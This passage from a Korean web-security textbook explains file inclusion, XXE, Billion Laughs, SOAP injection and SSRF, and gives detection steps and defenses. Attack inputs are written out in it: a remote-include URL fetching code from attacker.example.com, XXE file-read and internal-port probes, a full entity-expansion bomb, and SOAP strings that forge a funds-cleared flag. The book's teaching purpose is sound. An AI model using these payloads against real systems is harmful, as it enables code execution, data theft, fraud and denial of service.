접근할 디렉터리를 **chroot 환경**에 두면 대부분의 순회 영향을 완화할 수 있다. chroot된 디렉터리가 파일시스템 루트처럼 취급돼, 그 위로 올라가려는 잉여 순회 시퀀스가 무시된다. UNIX 계열은 chroot를 기본 지원하고, Windows에서는 시작 디렉터리를 새 논리 드라이브로 마운트해 유사한 효과를 낸다.

마지막으로, 순회 방어를 로깅·경보와 통합한다. 순회 시퀀스를 담은 요청은 사용자의 악의를 강하게 시사하므로, 보안 위반 시도로 로깅하고 세션을 종료하며 필요하면 계정을 정지하고 관리자에게 경보한다(→ 26.7).

> **이 절이 뒷받침하는 것**
>
> - 순회 필터 우회가 모두 인코딩·정규화의 응용이라는 사실 → **7.7** (정규화와 다중 인코딩), **31.7** (인코딩·정규화 결함 재방문)
> - 사용자 파일 이름 대신 인덱스로 간접 참조하는 방어 → **35.6** (간접 참조), **12.4** (리소스 매핑)

## 28.4 파일 경로 조작 (2) — 파일 인클루전(LFI/RFI)

많은 스크립트 언어가 **인클루드 파일(include file)** 을 지원한다. 재사용 코드 조각을 별도 파일에 두고, 필요할 때 기능별 코드 파일 안에 포함시킨다. 포함된 파일의 코드는 인클루드 지시문 자리에 삽입된 것처럼 해석된다. 사용자가 통제하는 데이터로 어느 파일을 포함할지 정해지면 파일 인클루전 취약점이 생긴다.

### 원격 파일 인클루전(RFI)

PHP는 인클루드 함수가 **원격 파일 경로**를 받을 수 있어 특히 취약하다. 위치에 따라 다른 콘텐츠를 주는 애플리케이션을 보자. 사용자가 위치를 고르면 요청 파라미터로 서버에 전달된다.

```
https://www.example-books.com/main.php?Country=US
```

애플리케이션은 `Country` 파라미터를 이렇게 처리한다.

```php
$country = $_GET['Country'];
include( $country . '.php' );
```

이는 서버 파일시스템의 `us.php`를 로드해 그 내용을 `main.php`에 복사·실행한다. 가장 심각한 익스플로잇은 인클루드 파일 위치로 **외부 URL**을 지정하는 것이다. PHP `include`는 이를 입력으로 받아 지정된 파일을 가져와 실행한다. 공격자는 임의로 복잡한 악성 스크립트를 자기 웹 서버에 두고 취약한 기능으로 실행시킬 수 있다.

```
https://www.example-books.com/main.php?Country=http://attacker.example.com/backdoor
```

이 지점에서 RFI는 28.8절이 다룰 SSRF와 겹친다 — 서버가 공격자가 지정한 URL로 아웃바운드 커넥션을 연다. 다만 RFI는 그 응답이 **실행되는 코드**가 된다는 점에서 위력이 더 크다.

### 로컬 파일 인클루전(LFI)

어떤 경우엔 인클루드 파일이 사용자 데이터로 로드되지만 외부 서버 URL은 지정할 수 없다. 예컨대 사용자 데이터가 ASP `Server.Execute`에 넘어가면, 같은 애플리케이션에 속한 임의의 ASP 스크립트를 실행시킬 수 있다. 이 상황에서도 무단 행위가 가능하다.

- 정상 경로로는 접근할 수 없는 서버 실행 파일이 있을 수 있다. `/admin` 경로 요청이 애플리케이션 전역 접근 제어로 막혀 있어도, 그 민감 기능을 내가 접근 권한을 가진 페이지에 포함시킬 수 있으면 그 기능에 도달한다(→ 24장 접근 제어와의 연결).
- 직접 접근이 막힌 정적 리소스가 있을 수 있다. 그것을 다른 페이지에 동적으로 포함시키면 실행 환경이 대개 그 내용을 응답에 그대로 복사한다.

### 파일 인클루전 결함 찾기

파일 인클루전은 어떤 사용자 데이터에도 생길 수 있으나, 언어·위치를 지정하는 파라미터와 서버 측 파일 이름이 명시적으로 넘어가는 파라미터에서 특히 흔하다. RFI 테스트는 (1) 각 표적 파라미터에 내가 통제하는 웹 서버 리소스 URL을 넣고 서버로부터 요청이 오는지 확인하고, (2) 실패하면 존재하지 않는 IP를 담은 URL을 넣어 연결 시도 중 타임아웃이 나는지 본다. LFI 테스트는 (1) 서버의 알려진 실행 리소스 이름을 넣어 동작 변화를 보고, (2) 알려진 정적 리소스 이름을 넣어 그 내용이 응답에 복사되는지 보고, (3) 직접 도달 못 하는 민감 기능·리소스 접근을 시도하고, (4) 앞 절의 순회 기법으로 다른 디렉터리 파일에 접근되는지 본다.

방어는 28.2절의 스크립트 인젝션 방어, 28.3절의 경로 순회 방어와 같다. 사용자 데이터를 인클루드 함수에 넘기지 않는 것이 최선이고, 불가피하면 화이트리스트로 엄격히 제한한다.

## 28.5 XML 인터프리터 인젝션 — XML 외부 엔티티(XXE)

XML은 오늘날 웹 애플리케이션 곳곳에서 쓰인다. 브라우저와 프런트엔드 서버 사이의 요청·응답에서도, 백엔드 컴포넌트(SOAP 서비스 등) 사이의 메시지에서도. 두 위치 모두 조작된 입력으로 애플리케이션 동작에 간섭하는 공격에 취약하다.

XML이 클라이언트에서 서버로 데이터를 보내는 데 쓰이는 경우가 가장 흔하며, 특히 비동기 요청으로 배경 통신을 하는 Ajax 애플리케이션에서 그렇다. 이 유형의 기능을 만나면 항상 **XML 외부 엔티티(XML external entity, XXE) 인젝션**을 확인해야 한다.

온라인 서점의 검색이 Ajax로 구현됐다고 하자. 사용자가 검색어를 입력하면 클라이언트 스크립트가 다음 요청을 보낸다.

```
POST /search/AjaxSearch.ashx HTTP/1.1
Host: www.example-books.com
Content-Type: text/xml; charset=UTF-8
Content-Length: 44

<Search><SearchTerm>dragon tattoo</SearchTerm></Search>
```

서버 응답은 다음과 같고, 클라이언트 스크립트가 이를 처리해 UI 일부를 검색 결과로 갱신한다.

```
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8

<Search><SearchResult>No results found for expression: dragon tattoo</SearchResult></Search>
```

XXE는 표준 XML 파싱 라이브러리가 **엔티티 참조(entity reference)** 를 지원하기 때문에 생긴다. 엔티티 참조는 XML 문서 안팎의 데이터를 참조하는 방법이다. `&lt;`와 `&gt;`(각각 `<`, `>`에 대응)가 익숙한 예다. XML 형식은 문서 시작의 선택적 `doctype` 요소 안에서 **커스텀 엔티티**를 정의할 수 있게 한다.

```xml
<!DOCTYPE foo [ <!ENTITY testref "testrefvalue" > ]>
```

이 정의가 있으면 파서는 문서 안의 `&testref;` 참조를 정의된 값 `testrefvalue`로 치환한다. 더 나아가 XML 명세는 값이 파서에 의해 **동적으로 가져와지는** 외부 참조로 엔티티를 정의하는 것을 허용한다. 이 외부 엔티티 정의는 URL 형식을 쓰며, 외부 웹 URL이나 로컬 파일시스템 리소스를 가리킬 수 있다. 파서는 지정된 URL·파일 내용을 가져와 엔티티 값으로 쓴다. 애플리케이션이 응답에 그 엔티티를 쓴 XML 부분을 반환하면, 지정된 파일·URL 내용이 응답에 그대로 실린다.

외부 엔티티는 `SYSTEM` 키워드로 지정하며 정의는 `file:` 프로토콜을 쓸 수 있는 URL이다. 공격자는 요청 XML에 적절한 `doctype`을 더해 서버 파일시스템의 파일을 참조하는 외부 엔티티를 정의한다.

```
POST /search/AjaxSearch.ashx HTTP/1.1
Host: www.example-books.com
Content-Type: text/xml; charset=UTF-8
Content-Length: 115

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///windows/win.ini" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

파서는 지정된 파일 내용을 가져와 `SearchTerm`에 쓰인 `&xxe;` 자리에 넣는다. 이 요소 값이 응답에 반향되므로 서버는 파일 내용으로 응답한다.

```
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8

<Search><SearchResult>No results found for expression: ; for 16-bit app support
[fonts]
[extensions]
...
```

XXE에서 응답 반향이 XSS의 반향과 닮았다는 점에 주의하라. 입력의 일부가 응답에 그대로 나타나는 것이 성공 신호다. 서버가 응답 콘텐츠 타입을 검증하지 않는 것(→ 10.7, MIME 타입)이 이 반향을 돕는 경우가 많고, 파서가 던지는 예외 메시지가 파일 내용을 노출하기도 한다(→ 30.5, 예외 페이로드에 무엇을 담지 말 것인가).

`file:` 외에 `http:` 같은 프로토콜을 쓰면 서버가 네트워크 너머 리소스를 가져오게 할 수 있다. 이 URL은 임의의 호스트·IP·포트를 지정할 수 있으며, 인터넷에서 직접 도달 못 하는 백엔드 시스템의 네트워크 서비스와 상호작용하게 할 수 있다. 다음은 사설 IP `192.168.1.1`의 25번 포트(메일 서버)에 연결을 시도하는 공격이다.

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:25" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

**이 순간 XXE는 SSRF가 된다.** 서버가 공격자가 지정한 임의 주소로 커넥션을 연다(→ 28.8). 이로써 공격자는 애플리케이션이 도달 가능한 웹 서버에서 민감 콘텐츠를 가져오는 프록시로 애플리케이션을 쓰거나, URL로 익스플로잇 가능한 백엔드 취약점을 공격하거나, 다수의 IP·포트를 순회하며 백엔드 시스템의 열린 포트를 탐지할 수 있다. 어떤 경우엔 타이밍 차이로 포트 상태를 추론하고, 어떤 경우엔 서비스 배너가 응답에 실려 돌아온다.

마지막으로, 애플리케이션이 외부 엔티티를 가져오되 응답에 반환하지 않아도, 파일 스트림을 무한정 읽게 해 **서비스 거부**를 일으킬 수 있다.

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///dev/random"> ]>
```

`/dev/random`은 끝나지 않는 스트림이라, 파서가 이를 계속 읽으며 자원을 소진한다. 이 DoS 벡터가 다음 절의 Billion Laughs로 이어진다. 두 공격은 같은 뿌리 — XML 파서가 기본적으로 너무 많은 기능을 켜 둔다는 것 — 를 공유한다.

## 28.6 Billion Laughs와 내부 엔티티 — XML 파서 설정, 설계 마인드셋, 운영 제약, 심층 보안

이 절은 이 책의 고유한 기여다. 앞 절이 외부 엔티티로 파일과 네트워크에 손을 뻗는 공격을 다뤘다면, 이 절은 **내부 엔티티만으로** 서버를 무너뜨리는 Billion Laughs 공격을 다루되, 그것을 단순한 공격 소개로 끝내지 않는다. Secure by Design 1.5절의 논지를 따라 이 문제를 **네 겹으로** 본다 — (1) 공격의 구조, (2) 파서 설정으로 막기, (3) 왜 파서가 위험한 기능을 기본으로 켜 두었는가라는 설계 마인드셋, (4) 설정 하나에 기대지 않는 심층 방어. 이 네 겹을 통과하면, 하나의 XML 취약점을 다루는 방식이 이 책 전체의 설계 철학을 압축해 보여 준다.

### (1) 공격의 구조 — 내부 엔티티의 확장성

먼저 내부 XML 엔티티를 복습하자. 내부 엔티티는 XML에서 간단한 약어를 만드는 강력한 구성물로, DTD(Document Type Definition) 안에 `<!ENTITY name "value">` 형식으로 정의된다.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE example [
  <!ELEMENT example (#PCDATA)>
  <!ENTITY title "Secure by Design">
]>
<example>&title;</example>
```

파서가 `title` 엔티티를 만나면 약어를 확장해 정의된 값으로 치환하므로, 최종적으로 `<example>Secure by Design</example>`이 된다. 엔티티 확장은 편리하지만, 동시에 **엔티티 확장 공격**의 문을 연다.

Billion Laughs 공격은 단순한 만큼 효과적이다. 핵심은 엔티티의 확장성을, **재귀적 정의로 거대한 메모리 사용량으로 부풀리는 것**이다. 1KB도 안 되는 작은 XML 블록으로 정의되므로 크기·길이에 기대는 검증을 대부분 통과한다.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE lolz [
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

파서가 이 XML을 로드하면 `lol9`가 10개의 `lol8`로, 그것이 100개의 `lol7`로 확장되고, 이어져 최종적으로 **10억 개의 `lol` 문자열**이 되어 수 기가바이트의 메모리를 소진한다. 이것이 이름의 유래다. 이는 명백히 엔티티의 의도된 동작을 위반하지만, **엔티티가 XML 언어의 일부라는 사실만으로 모든 파서가 확장 공격에 취약하다.**

### (2) 파서 설정으로 막기

엔티티 확장을 막으려면 엔티티 동작을 제어하는 설정을 찾아야 한다. 그런데 이것은 파서 구현을 완전히 이해하지 않으면 놀랍도록 까다롭다. **모든 파서가 다르게 동작하기 때문이다.** 견고한 출발점은 OWASP 같은 외부 자료를 가이드로 쓰는 것이다. 다음은 OWASP 권고를 기반으로 한 Java(DOM) 파서 설정 예다.

```java
import static javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING;

public final class XMLParser {
  static final String DISALLOW_DOCTYPE =
      "http://apache.org/xml/features/disallow-doctype-decl";
  static final String ALLOW_EXT_GEN_ENTITIES =
      "http://xml.org/sax/features/external-general-entities";
  static final String ALLOW_EXT_PARAM_ENTITIES =
      "http://xml.org/sax/features/external-parameter-entities";
  static final String ALLOW_EXTERNAL_DTD =
      "http://apache.org/xml/features/nonvalidating/load-external-dtd";

  public static Document parse(final InputStream input)
                                     throws SAXException, IOException {
    try {
      final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
      factory.setExpandEntityReferences(false);              // 엔티티 참조 확장 비활성화
      factory.setFeature(FEATURE_SECURE_PROCESSING, true);
      factory.setFeature(DISALLOW_DOCTYPE, true);            // XML의 DTD 금지
      factory.setFeature(ALLOW_EXT_GEN_ENTITIES, false);     // 외부 일반 엔티티 금지
      factory.setFeature(ALLOW_EXT_PARAM_ENTITIES, false);   // 외부 파라미터 엔티티 금지
      factory.setFeature(ALLOW_EXTERNAL_DTD, false);         // 외부 DTD 로드 금지
      return factory.newDocumentBuilder().parse(input);
    } catch(ParserConfigurationException e) {
      throw new IllegalStateException("Configuration Error", e);
    }
  }
}
```

선택된 기능이 상당히 침습적이라는 점에 주목하라. 엔티티에 관한 거의 모든 것이 비활성화된다. 예컨대 `disallow-doctype`은 엔티티 공격을 매우 어렵게 만들지만 동시에 전반적 사용성에 영향을 준다. **이런 상황에서 보안 우려는 종종 비즈니스 요구와 비교 검토되며, 설정을 약화하기로 결정한다면 그 위험이 무엇인지 이해하는 것이 중요하다.** 이 문장이 이 절의 나머지 세 겹을 여는 열쇠다.

빌드 파이프라인에 재귀적 엔티티 정의를 담은 테스트를 넣어 두면 엔티티 확장을 탐지할 수 있다. 엔티티가 확장되고 XML이 받아들여지면 테스트가 실패하도록 해, 파서가 확장 공격에 취약할 수 있음을 알린다(→ 46.12, 설정 검증의 안전망).

### (3) 설계 마인드셋 — 왜 파서는 위험한 기능을 기본으로 켜 두는가

여기서 한 걸음 물러서야 한다. 파서 설정에만 의존하는 것은 권장되지만, 어딘가 불안하다. 하부 파서 구현이 바뀌거나 기능 하나를 빠뜨리면 어떻게 되는가? 이 우려는 타당하며, 이를 해소하려면 **또 다른 층 — 설계 — 을 더해야 한다.**

설계 관점으로 접근하기 전에, "근본 원인이 엔티티가 확장되는 방식에 있다"는 생각을 버려야 한다. **확장은 XML 명세에 부합하는 것이지 결함 있는 파서 구현의 결과가 아니다.** 이것은 문제를 XML의 구조적 문제로 다뤄서는 안 되고, **수신 시스템의 입력 검증 문제**로 다뤄야 함을 뜻한다. 다시 말해 악성 XML 블록(Billion Laughs XML 같은)은 파싱되기 전에 수신 시스템이 거부해야 한다.

이 지점에서 XML 파서가 왜 위험한 기능을 기본으로 켜 두었는지가 설명된다. XML은 단순한 데이터 표현이 아니라 SGML에서 파생된 **완전한 언어**다. 그래서 대부분의 개발자가 신경 쓰지 않는 기능 — 외부 엔티티, DTD 로드, 재귀 확장 — 이 언어의 일부로 들어 있다. 파서를 만든 사람은 명세를 충실히 구현했을 뿐이다. 명세가 그 기능을 정의하므로 파서가 그것을 지원하는 것은 "버그"가 아니라 "정확한 구현"이다. 위험은 **명세가 정의한 강력한 기능을, 그 기능이 필요 없는 수신 시스템이 그대로 켜 둔 채 신뢰되지 않는 입력을 먹인다**는 데 있다.

여기서 이 책이 반복해 온 설계 원칙이 나온다. **필요하지 않은 기능은 끈다.** 서점의 검색 XML에 외부 엔티티나 재귀 엔티티가 필요할 이유가 없다. 그렇다면 그 기능은 공격 표면일 뿐 아무 가치도 주지 않는다. 기능을 켜 두는 것의 기본값이 "허용"인 컴포넌트를 신뢰 경계에 놓을 때, 설계자의 첫 임무는 그 기본값을 뒤집어 "명시적으로 필요한 것만 허용"으로 만드는 것이다. 이것이 복잡도 축소가 곧 방어라는 명제(→ 31.9)의 XML 판이다.

Billion Laughs 문제를 입력 검증 문제로 다루면, 해법은 앞서 정리한 검증 순서(→ 43.4)의 두 번째 단계 — **어휘적 내용 스캔(lexical content scan)** — 에 있다. 어휘적 스캔은 문자 스트림을 토큰 시퀀스로 바꾸되 그 순서나 의미는 분석하지 않는 과정이다(의미 분석은 파서의 일이다). SAX 파서(Simple API for XML)를 어휘 스캐너로 쓰면, 데이터 스트림에서 토큰이 식별될 때마다 이벤트를 방출하므로 엔티티가 나타나는 즉시 예외를 던져 스캔을 중단할 수 있다.

```java
public class LexicalScanner {
  private static final String LEXICAL_HANDLER =
      "http://xml.org/sax/properties/lexical-handler";

  public static boolean isValid(final InputStream data) throws Exception {
    notNull(data);
    final SAXParser saxParser = SAXParserFactory.newInstance().newSAXParser();
    final ElementHandler handler = new ElementHandler();
    saxParser.getXMLReader().setProperty(LEXICAL_HANDLER, handler);
    try {
      saxParser.parse(data, handler);   // 엔티티 유무를 스캔
      return true;
    } catch(IllegalArgumentException e) {
      return false;
    }
  }

  public static final class ElementHandler extends org.xml.sax.ext.DefaultHandler2 {
    @Override
    public void startEntity(final String name) throws SAXException {
      throw new IllegalArgumentException("Entities are illegal");   // 엔티티 발견 시 중단
    }
  }
}
```

어휘 스캔의 목적은 엔티티 거부만이 아니다. **필수 요소가 모두 존재하는지**도 확인해야 한다. 그렇지 않으면 애초에 파싱할 이유가 없다. 고객 객체 XML에 전화번호·주소가 필수, 이메일이 선택이라면, 이 셋을 다 갖춘 XML만 파서로 넘기고 나머지 조합은 거부한다. 이때 어휘 스캔은 **요소의 존재만 신경 쓰고 의미·순서·중복 여부는 보지 않는다.** 의미 분석을 더하는 순간 그것은 파싱이 되어 원점으로 돌아가기 때문이다. 필수 요소를 컬렉션에 담아 두고 발견될 때마다 제거한 뒤, 문서 끝에서 컬렉션이 비었는지 확인하는 방식으로 구현한다. 필수 아닌 요소는 관대하게 무시한다 — 이는 Postel의 법칙과 Tolerant Reader 패턴("받을 때는 관대하게, 보낼 때는 보수적으로")을 따른 의도적 선택으로, 무시되는 데이터 필드의 변경이 통합에 매끄럽게 흡수되게 한다.

### (4) 운영 제약과 심층 보안

어휘 스캔과 파서 설정은 모두 **엔티티를 담은 XML을, 악성이든 아니든 가리지 않고 거부함으로써** 확장 공격을 막는다. 이는 엔티티가 불법일 때만 통한다. 그러면 **엔티티가 필요한 경우**엔 어떻게 하는가? 어휘 스캔이 무용지물이 되는가? 아니다. 다른 각도에서 접근하면 된다.

Billion Laughs XML의 진짜 위험이 어디 있는지 다시 보자. 일차 용의자는 엔티티 확장이지만, 확장 자체가 엔티티를 위험하게 만드는 것은 아니다. **위험한 것은 확장의 결과로 생기는 메모리 사용량이다.** 즉 엔티티를 담은 XML을 파싱하는 것이 본질적으로 위험한 게 아니라, 결과 XML의 실제 크기가 위험한 것이다. 따라서 실행 가능한 해법은 **엔티티 확장을 허용하되 파서 프로세스에 운영 제약(operational constraint) — 메모리 한도나 쿼터 — 을 걸어** 폭주하는 자원 소비를 막는 것이다.

그러나 이 접근만으로는 자원 고갈이 자동으로 막히지 않는다. 단일 파서 프로세스가 한도 초과 시 종료돼 과소비를 막더라도, **여러 프로세스를 병렬로 돌리면** Billion Laughs와 비슷한 상황이 재현된다. 각 프로세스가 최대 자원을 쓰면 총 사용량이 프로세스 수에 비례하고, 같은 자원(CPU·메모리)에 의존하는 시스템의 다른 부분이 영향을 받는다. 이 때문에 **파싱을 격리(isolation)해서** 하는 설계가 필요하다. 연쇄 실패의 위험을 줄이기 때문이다(→ 45.5, 벌크헤드로 격리하기).

운영 제약은 그 자체로 유효한 해법이지만, 어휘 스캔이나 파서 설정을 무용화하지 않는다. 오히려 **세 전략을 모두 적용하는 설계**가 시스템을 확장 공격에 훨씬 견고하게 만든다. 이것이 심층 보안(security in depth)이다.

집 비유가 이를 잘 보여 준다. 대부분의 개발자는 파서 설정만으로 확장 공격을 다루려 하는데, 이는 **문을 잠그지 않고 집 주위에 울타리만 세우는 것**과 같다. 울타리가 버티는 한 아무도 못 들어오지만, 뚫리면 곧장 접근이 허용된다. 바람직하지 않다. 문을 잠그고 안쪽에 경보기를 다는 것 — 여러 층의 방어 — 이 심층 보안이다.

Billion Laughs 방어를 이 비유에 대응시키면 세 층이 선명해진다.

- **파서 설정 = 집 주위 울타리.** 강하지만 때로 너무 엄격하다. 모든 엔티티를 거부할 수 없는 상황이라면, 울타리를 통째로 없애지 말고 어떤 엔티티가 필요한지 이해해 **내부 엔티티만 허용**하는 식으로 약화한다. 완벽하진 않지만 여전히 울타리다.
- **어휘 스캔 = 열쇠 가진 사람만 들이기.** 필수 요소를 가진 XML만 파서로 넘겨, 파싱해야 할 XML 집합을 비즈니스 요건을 만족할 법한 것으로 대폭 줄인다. 공격 벡터가 그만큼 좁아진다.
- **운영 제약 = 집 안의 감시견.** 엔티티를 받아야 해서 어휘 스캔을 약화해야 한다면(2층 창문을 열어 두는 것), 운영 제약이 파싱 프로세스가 자원을 과소비하지 않도록 지킨다.

파서 설정, 어휘 스캔, 운영 제약을 함께 적용하면 확장 공격은 현저히 어려워진다. 그리고 이것이 secure by design의 핵심이다 — **설계를 안전한 소프트웨어를 만드는 일차 도구이자 마인드셋으로 삼는 것.** 설정 하나에 기대는 대신, 각 층이 다른 층의 실패를 메우도록 배치한다.

> **이 절이 뒷받침하는 것**
>
> - "필요 없는 기능은 끈다"와 절충적 태도로 설정을 약화할 때의 위험 이해 → **41.8** (절충적 태도 유지하기 / 운영 제약과 심층 보안)
> - 악성 XML을 파싱 전에 거부한다는 발상, 검증의 순서 → **43.4** (데이터 출처 → 크기 → 어휘적 내용 → 구문 → 의미)
> - 파싱을 격리해 연쇄 실패를 막는 설계 → **45.5** (벌크헤드), **45.8** (DoS를 설계로 막기)
> - 설정 하나에 의존하지 않고 여러 층을 배치하는 불변의 설계 → **43.1** (불변성), **31.9** (복잡도 축소가 곧 방어다)

## 28.7 SOAP 서비스 인젝션 — 탐지, 익스플로잇, 방어

SOAP(Simple Object Access Protocol)는 XML 형식으로 데이터를 캡슐화하는 메시지 기반 통신 기술이다. 서로 다른 운영체제·아키텍처에서 도는 시스템 사이에서도 정보를 공유하고 메시지를 전송할 수 있으며, 주 용도는 웹 서비스다. 브라우저로 접근하는 웹 애플리케이션 맥락에서는 대개 **백엔드 컴포넌트 사이의 통신**에서 SOAP를 만난다. 개별 작업을 다른 컴퓨터가 수행해 성능을 높이는 대규모 엔터프라이즈 애플리케이션, 또는 기존 애플리케이션 앞단에 웹 애플리케이션을 붙인 경우에 흔하다.

XML은 해석되는 언어이므로 SOAP도 앞서 본 것과 비슷하게 코드 인젝션에 취약할 수 있다. XML 요소는 메타문자 `<`, `>`, `/`로 구문 표현된다. 이 문자를 담은 사용자 데이터가 SOAP 메시지에 직접 삽입되면, 공격자는 메시지 구조에 간섭해 애플리케이션 로직을 교란할 수 있다. **이것은 27장의 인젝션 구조가 XML 문서라는 채널에서 재현되는 것이다** — 데이터와 구분자(`<`, `>`, `/`)가 같은 채널을 공유한다.

은행 애플리케이션에서 사용자가 자금 이체를 시작하는 요청을 보자.

```
POST /bank/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65

FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
```

처리 과정에서 두 백엔드 컴포넌트 사이에 다음 SOAP 메시지가 오간다.

```xml
<soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope">
  <soap:Body>
    <pre:Add xmlns:pre="http://target/lists"
             soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding">
      <Account>
        <FromAccount>18281008</FromAccount>
        <Amount>1430</Amount>
        <ClearedFunds>False</ClearedFunds>
        <ToAccount>08447656</ToAccount>
      </Account>
    </pre:Add>
  </soap:Body>
</soap:Envelope>
```

XML 요소가 HTTP 요청 파라미터에 대응하며, `ClearedFunds` 요소가 추가된 점에 주목하라. 이 시점에 애플리케이션은 자금이 부족하다고 판단해 이 값을 `False`로 설정했고, 메시지를 받는 컴포넌트는 그에 따라 이체를 수행하지 않는다.

공격자는 SOAP 메시지에 주입해 로직에 간섭할 수 있다. 다음 요청은 원래 요소 앞에 `ClearedFunds` 요소를 추가로 삽입한다(XML 문법 유효성은 보존). 애플리케이션이 처음 만나는 `ClearedFunds`를 처리한다면, 자금이 없어도 이체에 성공한다.

```
FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit
```

마지막 요소를 처리한다면 같은 공격을 `ToAccount`에 넣는다. 다른 유형은 **XML 주석**으로 원래 메시지 일부를 지우고 자기 것으로 대체하는 것이다. 다음은 `Amount`로 `ClearedFunds`를 주입하고, `ToAccount` 여는 태그를 제공한 뒤 주석을 열고, `ToAccount` 파라미터에서 주석을 닫아 XML 유효성을 유지한다.

```
FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit
```

주입된 파라미터 안에서 SOAP 메시지 전체를 완성하고 나머지를 주석 처리하려는 시도도 있으나, 여는 주석에 대응하는 닫는 주석이 없어 엄격히 무효인 XML이 되므로 대부분의 표준 XML 파싱 라이브러리는 거부한다. 이 공격은 손수 만든 커스텀 XML 파서에서만 통할 가능성이 크다.

### 탐지와 익스플로잇

SOAP 인젝션은 탐지가 어렵다. XML 메타문자를 조작 없이 넣으면 SOAP 메시지 형식이 깨져 대개 정보 없는 오류 메시지가 나온다. 그럼에도 다음 단계로 어느 정도 신뢰성 있게 탐지할 수 있다.

- 각 파라미터에 불량 닫는 태그 `</foo>`를 차례로 넣는다. 오류가 없으면 입력이 SOAP 메시지에 삽입되지 않거나 정제되고 있는 것이다.
- 오류가 났으면 유효한 여닫는 태그 쌍 `<foo></foo>`를 넣는다. 오류가 사라지면 취약할 수 있다.
- 삽입된 데이터가 XML 형태에서 다시 읽혀 사용자에게 반환되는 경우, `test<foo/>`와 `test<foo></foo>`를 차례로 넣어 하나가 다른 것으로, 또는 그냥 `test`로 반환되는지 본다. 그러면 입력이 XML 기반 메시지에 삽입됨을 확신할 수 있다.
- 여러 파라미터가 SOAP 메시지에 들어갈 수 있으면, 한 파라미터에 여는 주석 `<!--`을, 다른 파라미터에 닫는 주석 `-->`을 넣고 서로 바꿔 본다(파라미터 순서를 알 수 없으므로). 서버 SOAP 메시지의 일부가 주석 처리되어 로직 변화나 정보를 드러내는 오류를 낳을 수 있다.

익스플로잇은 탐지보다 더 어렵다. 대개 데이터를 감싸는 XML 구조를 알아야 메시지를 무효화하지 않고 조작할 수 있다. 모든 테스트에서 SOAP 메시지의 세부를 드러내는 오류 메시지를 찾는다. 운이 좋아 상세 메시지가 전체 메시지를 노출하면 조작 값을 구성할 수 있고, 운이 나쁘면 순전한 추측에 의존해 성공 가능성이 매우 낮다.

### 방어

SOAP 인젝션은 사용자 데이터가 SOAP 메시지에 삽입되는 모든 지점에서 **경계 검증(boundary validation)** 필터를 적용해 막는다(→ 43.5). 현재 요청에서 갓 받은 데이터뿐 아니라 이전 요청에서 지속된 데이터, 다른 처리에서 생성된 데이터에도 적용해야 한다.

앞선 공격을 막으려면 사용자 입력에 나타나는 XML 메타문자를 **HTML 인코딩**한다. 리터럴 문자를 대응하는 엔티티로 치환하는 것이다. `<` → `&lt;`, `>` → `&gt;`, `/` → `&#47;`. 이러면 XML 인터프리터가 이들을 해당 요소의 데이터 값의 일부로 취급하고 메시지 구조의 일부로 취급하지 않는다.

## 28.8 백엔드 HTTP 요청 인젝션 — 서버 측 리다이렉션(SSRF), HTTP 파라미터 인젝션

앞 절은 사용자 데이터를 백엔드 SOAP 요청에 심는 경우를 다뤘다. 더 일반적으로, 애플리케이션은 사용자 입력을 **어떤 종류의 백엔드 HTTP 요청**에든 심을 수 있다 — 이름/값 쌍을 전송하는 평범한 요청을 포함해서. 이 동작은 종종 취약하다. 애플리케이션이 사실상 사용자가 준 URL이나 파라미터를 프록시하기 때문이다. 이런 공격은 두 부류로 나뉜다.

- **서버 측 HTTP 리다이렉션(server-side HTTP redirection)** — 공격자가 임의의 리소스·URL을 지정하면 프런트엔드 애플리케이션 서버가 그것을 가져온다. 이것이 흔히 **SSRF(Server-Side Request Forgery)** 라 불리는 것이다.
- **HTTP 파라미터 인젝션(HTTP parameter injection, HPI)** — 공격자가 애플리케이션 서버가 만드는 백엔드 요청에 임의 파라미터를 주입한다. 이미 존재하는 파라미터를 주입하면 **HTTP 파라미터 오염(HPP)** 으로 원래 값을 덮어쓸 수 있다.

### 서버 측 HTTP 리다이렉션 (SSRF)

